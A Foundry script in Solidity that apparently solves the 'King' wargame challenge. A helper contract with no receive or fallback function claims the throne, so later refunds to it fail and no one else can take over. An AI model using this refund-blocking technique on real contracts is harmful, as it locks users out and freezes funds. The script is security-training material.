// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/King.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract Lastking {
    constructor(King _kingInstance) payable {
        address(_kingInstance).call{value: _kingInstance.prize()}("");
    }
}

contract KingSolution is Script {

    King public kingInstance = King(payable(0x142Bb2268021E3948047B98B7b716e448b0b275e));

    function run() external {

      vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
       new Lastking{value: kingInstance.prize()}(kingInstance);
      vm.stopBroadcast();
    }

}